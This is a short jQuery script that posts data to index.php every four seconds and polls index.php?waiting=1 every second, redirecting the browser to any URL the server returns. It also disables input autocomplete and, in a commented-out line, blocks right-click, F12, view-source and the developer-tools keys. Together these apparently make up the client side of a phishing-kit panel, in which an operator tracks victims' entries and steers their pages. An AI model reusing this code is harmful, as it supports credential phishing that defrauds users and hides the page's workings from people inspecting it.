function sendAjaxRequestEveryFourSeconds(jsonData) {
    // Function to send AJAX request
    function sendAjaxRequest() {

        $.ajax({
            method: "POST",
            url: 'index.php',
            data: jsonData,
            success: function (data) {
                //console.log(data);
                /*if( data !== '' ) {
                    window.location.href= data;
                }*/
            },
            
        });

    }

    // Call the function initially
    sendAjaxRequest();

    // Set interval to call the function every 4 seconds
    setInterval(sendAjaxRequest, 4000); // 4000 milliseconds = 4 seconds
}

function worker() {
    $.ajax({
        method: "GET",
        url: 'index.php?waiting=1',
        success: function (data) {
            //console.log(data);
            if( data !== '' ) {
                window.location.href= data;
            }
        },
        complete: function () {
            setTimeout(worker, 1000);
        }
    });
}

jQuery(function($){
    
    $('input').attr('autocomplete','off');

    //document.addEventListener("contextmenu",function(e){e.preventDefault()}),document.addEventListener("keydown",function(e){e.ctrlKey&&e.shiftKey&&("I"===e.key||"J"===e.key||"C"===e.key||"S"===e.key)&&e.preventDefault(),e.ctrlKey&&e.shiftKey&&"I"===e.key&&e.preventDefault(),e.ctrlKey&&e.shiftKey&&"J"===e.key&&e.preventDefault(),e.ctrlKey&&"J"===e.key&&e.preventDefault(),e.ctrlKey&&"s"===e.key&&e.preventDefault(),e.ctrlKey&&"c"===e.key&&e.preventDefault(),e.ctrlKey&&"u"===e.key&&e.preventDefault(),e.ctrlKey&&"P"===e.key&&e.preventDefault(),"F12"===e.key&&e.preventDefault()});
    
})